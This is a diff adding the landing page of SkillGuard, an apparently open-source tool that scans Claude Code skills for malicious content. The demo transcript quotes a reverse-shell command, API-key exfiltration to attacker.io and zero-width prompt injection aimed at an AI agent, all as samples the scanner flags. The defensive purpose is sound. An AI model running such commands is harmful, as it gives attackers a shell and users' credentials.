@@ -1,0 +1,699 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>SkillGuard — scan Claude Code skills before Claude runs them</title>
+  <meta name="description" content="Open-source security scanner that catches prompt injection, credential theft, and reverse shells in Claude Code skills before Claude ever executes them. Local-only, no cloud upload." />
+
+  <!-- Favicon: inline SVG shield-with-check -->
+  <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%233DDC97' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpath d='M12 2 4 5v6c0 5 3.5 8.5 8 10 4.5-1.5 8-5 8-10V5l-8-3Z'/%3E%3Cpath d='m9 12 2 2 4-4'/%3E%3C/svg%3E" />
+
+  <!-- Open Graph / Twitter -->
+  <meta property="og:type" content="website" />
+  <meta property="og:title" content="SkillGuard — scan Claude Code skills before Claude runs them" />
+  <meta property="og:description" content="Open-source scanner that catches prompt injection, credential theft, and reverse shells in community skills — before Claude ever executes them. Local-only. No cloud upload." />
+  <meta property="og:image" content="og.png" />
+  <meta property="og:url" content="https://skillguard.sh/" />
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="SkillGuard — scan Claude Code skills before Claude runs them" />
+  <meta name="twitter:description" content="Open-source scanner that catches prompt injection, credential theft, and reverse shells in community skills — before Claude ever executes them. Local-only. No cloud upload." />
+  <meta name="twitter:image" content="og.png" />
+
+  <!-- Fonts -->
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet" />
+
+  <style>
+    :root {
+      --bg: #0B0E14;
+      --panel: #0D1117;
+      --panel-2: #11151C;
+      --border: #1E2530;
+      --text: #E6EAF0;
+      --muted: #9BA6B6;
+      --accent: #3DDC97;
+      --red: #FF5C5C;
+      --amber: #FFB454;
+      --font-ui: "Space Grotesk", system-ui, -apple-system, sans-serif;
+      --font-mono: "JetBrains Mono", ui-monospace, "SFMono-Regular", Menlo, monospace;
+      --maxw: 1080px;
+    }
+
+    * { box-sizing: border-box; }
+
+    html { scroll-behavior: smooth; }
+
+    body {
+      margin: 0;
+      background: var(--bg);
+      color: var(--text);
+      font-family: var(--font-ui);
+      font-size: 17px;
+      line-height: 1.6;
+      -webkit-font-smoothing: antialiased;
+      text-rendering: optimizeLegibility;
+    }
+
+    a { color: var(--accent); text-decoration: none; }
+    a:hover { text-decoration: underline; }
+
+    /* Visible focus states for accessibility */
+    a:focus-visible,
+    button:focus-visible {
+      outline: 2px solid var(--accent);
+      outline-offset: 3px;
+      border-radius: 4px;
+    }
+
+    .container {
+      width: 100%;
+      max-width: var(--maxw);
+      margin: 0 auto;
+      padding: 0 24px;
+    }
+
+    /* ---------- Skip link ---------- */
+    .skip-link {
+      position: absolute;
+      left: -9999px;
+      top: 0;
+      background: var(--accent);
+      color: #04140C;
+      padding: 10px 16px;
+      font-weight: 600;
+      border-radius: 0 0 8px 0;
+      z-index: 100;
+    }
+    .skip-link:focus { left: 0; }
+
+    /* ---------- Nav ---------- */
+    .nav {
+      position: sticky;
+      top: 0;
+      z-index: 50;
+      background: rgba(11, 14, 20, 0.82);
+      backdrop-filter: blur(10px);
+      -webkit-backdrop-filter: blur(10px);
+      border-bottom: 1px solid var(--border);
+    }
+    .nav-inner {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      height: 60px;
+    }
+    .brand {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-weight: 700;
+      font-size: 19px;
+      color: var(--text);
+      letter-spacing: -0.01em;
+    }
+    .brand:hover { text-decoration: none; }
+    .brand svg { display: block; }
+    .nav-links {
+      display: flex;
+      align-items: center;
+      gap: 28px;
+    }
+    .nav-links a {
+      color: var(--muted);
+      font-size: 15px;
+      font-weight: 500;
+    }
+    .nav-links a:hover { color: var(--text); text-decoration: none; }
+
+    /* ---------- Hero ---------- */
+    .hero {
+      position: relative;
+      padding: 90px 0 70px;
+      overflow: hidden;
+    }
+    /* Single restrained radial green glow behind the install box */
+    .hero::before {
+      content: "";
+      position: absolute;
+      top: 46%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 760px;
+      height: 520px;
+      max-width: 95vw;
+      background: radial-gradient(ellipse at center, rgba(61, 220, 151, 0.16) 0%, rgba(61, 220, 151, 0.05) 38%, transparent 70%);
+      pointer-events: none;
+      z-index: 0;
+    }
+    .hero .container { position: relative; z-index: 1; }
+
+    h1 {
+      font-size: clamp(34px, 6vw, 56px);
+      line-height: 1.08;
+      font-weight: 700;
+      letter-spacing: -0.025em;
+      margin: 0 auto 24px;
+      max-width: 880px;
+      text-align: center;
+    }
+    h1 .em { color: var(--accent); }
+    .subhead {
+      font-size: clamp(17px, 2.4vw, 21px);
+      color: var(--muted);
+      max-width: 720px;
+      margin: 0 auto 44px;
+      text-align: center;
+    }
+    .subhead strong { color: var(--text); font-weight: 600; }
+
+    /* ---------- Install block ---------- */
+    .install {
+      max-width: 660px;
+      margin: 0 auto;
+    }
+    .codebox {
+      position: relative;
+      background: var(--panel);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      box-shadow: 0 18px 50px -20px rgba(0, 0, 0, 0.7);
+    }
+    .codebox-head {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 10px 14px 10px 16px;
+      border-bottom: 1px solid var(--border);
+    }
+    .codebox-label {
+      font-family: var(--font-mono);
+      font-size: 12px;
+      color: var(--muted);
+      letter-spacing: 0.04em;
+      text-transform: uppercase;
+    }
+    .copy-btn {
+      font-family: var(--font-mono);
+      font-size: 13px;
+      font-weight: 500;
+      color: var(--muted);
+      background: var(--panel-2);
+      border: 1px solid var(--border);
+      border-radius: 7px;
+      padding: 6px 12px;
+      cursor: pointer;
+      transition: color 0.15s, border-color 0.15s;
+      white-space: nowrap;
+    }
+    .copy-btn:hover { color: var(--text); border-color: #2A3340; }
+    .copy-btn.copied { color: var(--accent); border-color: var(--accent); }
+    .codebox pre {
+      margin: 0;
+      padding: 18px 16px;
+      overflow-x: auto;
+      font-family: var(--font-mono);
+      font-size: 15px;
+      line-height: 1.85;
+      color: var(--text);
+    }
+    .codebox pre .prompt { color: var(--accent); user-select: none; }
+
+    .verify {
+      margin: 18px 4px 0;
+      font-size: 15px;
+      color: var(--muted);
+      display: flex;
+      flex-wrap: wrap;
+      align-items: center;
+      gap: 6px 14px;
+    }
+    .verify .check { color: var(--accent); font-weight: 700; }
+    .verify .sep { color: var(--border); }
+    .verify-links { display: flex; gap: 16px; margin-left: auto; }
+    .verify-links a { font-size: 14px; font-weight: 500; }
+
+    /* ---------- Section scaffolding ---------- */
+    section { padding: 72px 0; }
+    .section-label {
+      font-family: var(--font-mono);
+      font-size: 13px;
+      letter-spacing: 0.18em;
+      text-transform: uppercase;
+      color: var(--accent);
+      text-align: center;
+      margin: 0 0 14px;
+    }
+    h2 {
+      font-size: clamp(26px, 4vw, 34px);
+      font-weight: 600;
+      letter-spacing: -0.02em;
+      text-align: center;
+      margin: 0 0 48px;
+    }
+
+    /* ---------- Demo / terminal ---------- */
+    .terminal {
+      max-width: 820px;
+      margin: 0 auto;
+      background: var(--panel);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      overflow: hidden;
+      box-shadow: 0 24px 60px -28px rgba(0, 0, 0, 0.8);
+    }
+    .terminal-bar {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      padding: 12px 16px;
+      background: var(--panel-2);
+      border-bottom: 1px solid var(--border);
+    }
+    .dot { width: 12px; height: 12px; border-radius: 50%; display: block; }
+    .dot.r { background: #FF5F56; }
+    .dot.y { background: #FFBD2E; }
+    .dot.g { background: #27C93F; }
+    .terminal-title {
+      margin-left: 10px;
+      font-family: var(--font-mono);
+      font-size: 12.5px;
+      color: var(--muted);
+    }
+    .terminal video {
+      display: block;
+      width: 100%;
+      height: auto;
+      background: var(--bg);
+    }
+    /* Static <pre> fallback transcript (no-JS / reduced-motion) */
+    .transcript {
+      margin: 0;
+      padding: 22px 20px;
+      font-family: var(--font-mono);
+      font-size: 14.5px;
+      line-height: 1.85;
+      color: var(--text);
+      overflow-x: auto;
+      background: var(--bg);
+    }
+    .transcript .prompt { color: var(--accent); }
+    .transcript .dim { color: var(--muted); }
+    .transcript .scan { color: var(--amber); }
+    .transcript .blocked { color: var(--red); font-weight: 500; }
+    .transcript .refused { color: var(--muted); }
+
+    /* The fallback transcript is shown when video is absent or motion is reduced */
+    .terminal[data-show-fallback="true"] video { display: none; }
+    .terminal:not([data-show-fallback="true"]) .transcript { display: none; }
+
+    @media (prefers-reduced-motion: reduce) {
+      .terminal video { display: none !important; }
+      .terminal .transcript { display: block !important; }
+      html { scroll-behavior: auto; }
+    }
+
+    /* ---------- Pillars ---------- */
+    .pillars {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 22px;
+    }
+    .pillar {
+      background: var(--panel);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 28px 24px;
+    }
+    .pillar-icon {
+      color: var(--accent);
+      margin-bottom: 16px;
+      display: block;
+    }
+    .pillar h3 {
+      font-size: 19px;
+      font-weight: 600;
+      margin: 0 0 10px;
+      letter-spacing: -0.01em;
+    }
+    .pillar p { margin: 0; color: var(--muted); font-size: 16px; }
+    .pillar p code {
+      font-family: var(--font-mono);
+      font-size: 14px;
+      color: var(--text);
+      background: var(--panel-2);
+      padding: 1px 6px;
+      border-radius: 5px;
+    }
+
+    /* ---------- What it catches ---------- */
+    .catches {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 16px 28px;
+      max-width: 820px;
+      margin: 0 auto;
+    }
+    .catch {
+      display: flex;
+      align-items: flex-start;
+      gap: 13px;
+      background: var(--panel);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 16px 18px;
+      font-size: 16px;
+    }
+    .catch svg { flex: 0 0 auto; color: var(--accent); margin-top: 3px; }
+
+    /* ---------- Second CTA ---------- */
+    .cta-section { text-align: center; }
+    .cta-section .install { margin-top: 8px; }
+
+    /* ---------- Footer ---------- */
+    footer {
+      border-top: 1px solid var(--border);
+      padding: 40px 0;
+    }
+    .footer-inner {
+      display: flex;
+      flex-wrap: wrap;
+      align-items: center;
+      justify-content: space-between;
+      gap: 16px;
+    }
+    .footer-brand {
+      display: flex;
+      align-items: center;
+      gap: 9px;
+      font-weight: 600;
+      color: var(--text);
+    }
+    .footer-links {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 12px 22px;
+      align-items: center;
+      color: var(--muted);
+      font-size: 15px;
+    }
+    .footer-links a { color: var(--muted); }
+    .footer-links a:hover { color: var(--text); }
+    .footer-links .sep { color: var(--border); }
+    .footer-note { color: var(--muted); font-size: 15px; }
+
+    /* ---------- Responsive ---------- */
+    @media (max-width: 860px) {
+      .pillars { grid-template-columns: 1fr; }
+      .catches { grid-template-columns: 1fr; }
+    }
+    @media (max-width: 600px) {
+      body { font-size: 16px; }
+      .nav-links { gap: 18px; }
+      .hero { padding: 60px 0 50px; }
+      section { padding: 56px 0; }
+      .verify-links { margin-left: 0; width: 100%; }
+      .codebox pre { font-size: 13.5px; }
+      .transcript { font-size: 12.5px; }
+    }
+    @media (max-width: 380px) {
+      .container { padding: 0 16px; }
+      .brand { font-size: 17px; }
+      .nav-links a { font-size: 14px; }
+    }
+  </style>
+</head>
+<body>
+  <a class="skip-link" href="#main">Skip to content</a>
+
+  <!-- NAV -->
+  <header class="nav">
+    <div class="container nav-inner">
+      <a class="brand" href="#top" aria-label="SkillGuard home">
+        <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="#3DDC97" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+          <path d="M12 2 4 5v6c0 5 3.5 8.5 8 10 4.5-1.5 8-5 8-10V5l-8-3Z" />
+          <path d="m9 12 2 2 4-4" />
+        </svg>
+        <span>SkillGuard</span>
+      </a>
+      <nav class="nav-links" aria-label="Primary">
+        <a href="https://github.com/mannanj/skillguard#install" rel="noopener">Docs</a>
+        <a href="https://github.com/mannanj/skillguard" rel="noopener">GitHub</a>
+      </nav>
+    </div>
+  </header>
+
+  <main id="main">
+    <span id="top"></span>
+
+    <!-- HERO -->
+    <section class="hero" aria-labelledby="hero-heading">
+      <div class="container">
+        <h1 id="hero-heading">Nobody checks what's inside the skills Claude Code runs. <span class="em">SkillGuard does.</span></h1>
+        <p class="subhead">
+          Open-source scanner that catches prompt injection, credential theft, and reverse shells in community skills — <strong>before Claude ever executes them.</strong> Local-only. No cloud upload.
+        </p>
+
+        <div class="install">
+          <div class="codebox">
+            <div class="codebox-head">
+              <span class="codebox-label">Claude Code plugin · recommended</span>
+              <button class="copy-btn" type="button" data-copy="/plugin marketplace add mannanj/skillguard
+/plugin install skillguard@skillguard" aria-label="Copy install commands to clipboard">Copy</button>
+            </div>
+            <pre><code><span class="prompt">&gt; </span>/plugin marketplace add mannanj/skillguard
+<span class="prompt">&gt; </span>/plugin install skillguard@skillguard</code></pre>
+          </div>
+
+          <p class="verify">
+            <span><span class="check">&#10003;</span> Verify: SkillGuard status line appears on your next skill use</span>
+            <span class="verify-links">
+              <a href="https://github.com/mannanj/skillguard#install" rel="noopener">More install methods &rarr;</a>
+              <a href="https://github.com/mannanj/skillguard" rel="noopener">View source</a>
+            </span>
+          </p>
+        </div>
+      </div>
+    </section>
+
+    <!-- DEMO -->
+    <section aria-labelledby="demo-heading">
+      <div class="container">
+        <p class="section-label">See it block</p>
+        <h2 id="demo-heading">A malicious skill, refused at the gate</h2>
+
+        <div class="terminal" id="demo-terminal">
+          <div class="terminal-bar" aria-hidden="true">
+            <span class="dot r"></span>
+            <span class="dot y"></span>
+            <span class="dot g"></span>
+            <span class="terminal-title">skillguard — scan</span>
+          </div>
+
+          <!-- Swap src to the R2 URL on launch: src="demo.mp4" -->
+          <video
+            id="demo-video"
+            src="demo.mp4"
+            poster="demo-poster.png"
+            muted
+            autoplay
+            loop
+            playsinline
+            preload="metadata"
+            aria-label="Terminal recording: SkillGuard scanning the pretty-formatter skill and blocking it for a reverse shell, credential exfiltration, and prompt injection.">
+          </video>
+
+          <!-- Static transcript: serves no-JS and prefers-reduced-motion users -->
+          <pre class="transcript" role="img" aria-label="SkillGuard scan output: pretty-formatter blocked for a reverse shell, credential exfiltration, and prompt injection; the PreToolUse hook refused execution and zero commands ran.">
+<span class="prompt">$</span> skillguard --skill pretty-formatter
+<span class="scan">SkillGuard &#10687; scanning pretty-formatter ...</span>
+<span class="blocked">&#10007; BLOCKED  reverse shell: bash -i &gt;&amp; /dev/tcp/45.x.x.x/4444</span>
+<span class="blocked">&#10007; BLOCKED  credential exfil: reads ANTHROPIC_API_KEY &rarr; POST attacker.io</span>
+<span class="blocked">&#10007; BLOCKED  prompt injection in SKILL.md (zero-width chars)</span>
+<span class="refused">PreToolUse hook refused execution. 0 commands ran.</span></pre>
+        </div>
+      </div>
+    </section>
+
+    <!-- HOW IT WORKS -->
+    <section aria-labelledby="how-heading">
+      <div class="container">
+        <p class="section-label">How it works</p>
+        <h2 id="how-heading">Three ideas, no magic</h2>
+
+        <div class="pillars">
+          <article class="pillar">
+            <svg class="pillar-icon" width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+              <path d="M14 3v4a1 1 0 0 0 1 1h4" />
+              <path d="M5 3h9l5 5v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2Z" />
+              <path d="M8 12h8M8 16h6" />
+            </svg>
+            <h3>Scans every file in every skill</h3>
+            <p>Four engines run in concert: a local zero-dependency pattern engine, plus Cisco, Snyk, and SkillAudit when you want them.</p>
+          </article>
+
+          <article class="pillar">
+            <svg class="pillar-icon" width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+              <rect x="5" y="11" width="14" height="9" rx="2" />
+              <path d="M8 11V8a4 4 0 0 1 8 0v3" />
+              <path d="M12 15v2" />
+            </svg>
+            <h3>Blocks via PreToolUse hook</h3>
+            <p>An unscanned skill never executes. The hook intercepts the invocation and refuses anything it hasn't cleared.</p>
+          </article>
+
+          <article class="pillar">
+            <svg class="pillar-icon" width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+              <path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7-10-7-10-7Z" />
+              <circle cx="12" cy="12" r="3" />
+            </svg>
+            <h3>Rules you can read</h3>
+            <p>No cloud upload, no opaque scores. Every detection is a pattern you can open, audit, and understand for yourself.</p>
+          </article>
+        </div>
+      </div>
+    </section>
+
+    <!-- WHAT IT CATCHES -->
+    <section aria-labelledby="catches-heading">
+      <div class="container">
+        <p class="section-label">What it catches</p>
+        <h2 id="catches-heading">The threats hiding in community skills</h2>
+
+        <ul class="catches" role="list">
+          <li class="catch">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="m5 13 4 4L19 7" /></svg>
+            Prompt injection in SKILL.md
+          </li>
+          <li class="catch">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="m5 13 4 4L19 7" /></svg>
+            Credential &amp; env-var exfiltration
+          </li>
+          <li class="catch">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="m5 13 4 4L19 7" /></svg>
+            Reverse shells &amp; hidden subprocesses
+          </li>
+          <li class="catch">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="m5 13 4 4L19 7" /></svg>
+            Zero-width &amp; base64 obfuscation
+          </li>
+          <li class="catch">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="m5 13 4 4L19 7" /></svg>
+            Persistence &amp; container escape
+          </li>
+          <li class="catch">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="m5 13 4 4L19 7" /></svg>
+            <code style="font-family:var(--font-mono);font-size:14px;">curl | sh</code>&nbsp;pipe execution
+          </li>
+        </ul>
+      </div>
+    </section>
+
+    <!-- SECOND INSTALL CTA -->
+    <section class="cta-section" aria-labelledby="cta-heading">
+      <div class="container">
+        <p class="section-label">Get started</p>
+        <h2 id="cta-heading">Install in two lines</h2>
+
+        <div class="install">
+          <div class="codebox">
+            <div class="codebox-head">
+              <span class="codebox-label">Claude Code plugin · recommended</span>
+              <button class="copy-btn" type="button" data-copy="/plugin marketplace add mannanj/skillguard
+/plugin install skillguard@skillguard" aria-label="Copy install commands to clipboard">Copy</button>
+            </div>
+            <pre><code><span class="prompt">&gt; </span>/plugin marketplace add mannanj/skillguard
+<span class="prompt">&gt; </span>/plugin install skillguard@skillguard</code></pre>
+          </div>
+          <p class="verify">
+            <span><span class="check">&#10003;</span> Verify: SkillGuard status line appears on your next skill use</span>
+            <span class="verify-links">
+              <a href="https://github.com/mannanj/skillguard#install" rel="noopener">More install methods &rarr;</a>
+              <a href="https://github.com/mannanj/skillguard" rel="noopener">View source</a>
+            </span>
+          </p>
+        </div>
+      </div>
+    </section>
+  </main>
+
+  <!-- FOOTER -->
+  <footer>
+    <div class="container footer-inner">
+      <div class="footer-brand">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#3DDC97" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+          <path d="M12 2 4 5v6c0 5 3.5 8.5 8 10 4.5-1.5 8-5 8-10V5l-8-3Z" />
+          <path d="m9 12 2 2 4-4" />
+        </svg>
+        <span>SkillGuard</span>
+      </div>
+      <nav class="footer-links" aria-label="Footer">
+        <a href="https://github.com/mannanj/skillguard" rel="noopener">GitHub</a>
+        <span class="sep" aria-hidden="true">·</span>
+        <a href="https://github.com/mannanj/skillguard/blob/main/LICENSE" rel="noopener">Apache-2.0 License</a>
+        <span class="sep" aria-hidden="true">·</span>
+        <span class="footer-note">Built for the Claude Code community</span>
+      </nav>
+    </div>
+  </footer>
+
+  <script>
+    // Copy-to-clipboard with graceful fallback.
+    (function () {
+      function flash(btn) {
+        var original = btn.textContent;
+        btn.textContent = "Copied ✓";
+        btn.classList.add("copied");
+        setTimeout(function () {
+          btn.textContent = original;
+          btn.classList.remove("copied");
+        }, 1500);
+      }
+
+      function legacyCopy(text) {
+        var ta = document.createElement("textarea");
+        ta.value = text;
+        ta.setAttribute("readonly", "");
+        ta.style.position = "absolute";
+        ta.style.left = "-9999px";
+        document.body.appendChild(ta);
+        ta.select();
+        try { document.execCommand("copy"); } catch (e) { /* no-op */ }
+        document.body.removeChild(ta);
+      }
+
+      var buttons = document.querySelectorAll(".copy-btn");
+      for (var i = 0; i < buttons.length; i++) {
+        buttons[i].addEventListener("click", function () {
+          var btn = this;
+          var text = btn.getAttribute("data-copy") || "";
+          if (navigator.clipboard && navigator.clipboard.writeText) {
+            navigator.clipboard.writeText(text).then(
+              function () { flash(btn); },
+              function () { legacyCopy(text); flash(btn); }
+            );
+          } else {
+            legacyCopy(text);
+            flash(btn);
+          }
+        });
+      }
+
+      // Show the static transcript instead of the video if the video can't load,
+      // or if the user prefers reduced motion (CSS also enforces the latter).
+      var term = document.getElementById("demo-terminal");
+      var vid = document.getElementById("demo-video");
+      var reduce = window.matchMedia && window.matchMedia("(prefers-reduced-motion: reduce)").matches;
+      if (term && (reduce || !vid)) {
+        term.setAttribute("data-show-fallback", "true");
+      }
+      if (vid) {
+        vid.addEventListener("error", function () {
+          term.setAttribute("data-show-fallback", "true");
+        });
+      }
+    })();
+  </script>
+</body>
+</html>
